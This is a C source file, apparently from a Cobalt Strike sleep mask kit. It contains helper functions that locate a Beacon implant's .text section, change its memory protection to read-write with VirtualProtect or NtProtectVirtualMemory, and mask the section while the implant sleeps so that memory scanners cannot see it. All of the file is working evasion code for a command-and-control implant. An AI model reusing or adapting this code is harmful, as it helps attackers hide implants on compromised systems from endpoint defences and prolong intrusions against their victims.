/*
    Helper functions to help mask the text section when beacon sleeps.
    The masking of the text section is based on the Malleable C2 profile
    setting stage.userwx.

    stage.userwx = true
       Beacon will mask the text section when it sleeps as the memory
       protection is set to RWX.

    stage.userwx = false
       Beacon will not mask the section as the memory protection is set
       to RX in this case.

       These functions will help with that, so beacon can modify the
       memory protection before sleeping to RW to mask the section and
       when it wakes back up will un-mask the section and set the
       protection back to RX.
*/

typedef struct {
   int mask;
   DWORD start;
   DWORD end;
   DWORD old;
} SECTION_INFO;

int initialized = 0;
SECTION_INFO text_section = { 0 };

void setup_text_section(SLEEPMASKP * parms) {
   DWORD * index;
   DWORD a, b;

   // Only initialize once
   if (initialized) {
      return;
   }
   initialized = 1;

   /* find the first section after the .text section
    * if a == 0x1000 (assumed offset value)
    *    - this is the start offset of the .text section
    *    - it is in the list when stage.userwx = true and will automatically be masked.
    * if a > 0x1000
    *    - this is the first section after the .text section
    *    - the .text section start offset should be 0x1000
    *    - the .text section end offset will be the value of a
    */
   index = parms->sections;
   while (TRUE) {
      a = *index; b = *(index + 1);
      index += 2;
      if ((a == 0 && b == 0) || a == 0x1000)
         break;
      if (a > 0x1000) {
         text_section.mask = 1;
         text_section.start = 0x1000;
         text_section.end = a;
         break;
      }
   }
}

void mask_text_section(SLEEPMASKP * parms) {
   if (text_section.mask) {
#if USE_SYSCALLS
      SIZE_T size = text_section.end - text_section.start;
      PVOID ptr = (PVOID) (parms->beacon_ptr + text_section.start);

      if (0 != NtProtectVirtualMemory(GetCurrentProcess(), (PVOID) &ptr, &size, PAGE_READWRITE, &text_section.old)) {
         text_section.mask = 0;
         return;
      }
#else
      if (!VirtualProtect(parms->beacon_ptr + text_section.start, text_section.end - text_section.start, PAGE_READWRITE, &text_section.old)) {
          text_section.mask = 0;
          return;
      }
#endif

      mask_section(parms, text_section.start, text_section.end);
   }
}

void unmask_text_section(SLEEPMASKP * parms) {
   if (text_section.mask) {
      mask_section(parms, text_section.start, text_section.end);

#if USE_SYSCALLS
      SIZE_T size = text_section.end - text_section.start;
      PVOID ptr = (PVOID) (parms->beacon_ptr + text_section.start);
      NtProtectVirtualMemory(GetCurrentProcess(), (PVOID) &ptr, &size, text_section.old, &text_section.old);
#else
      VirtualProtect(parms->beacon_ptr + text_section.start, text_section.end - text_section.start, text_section.old, &text_section.old);
#endif
   }
}
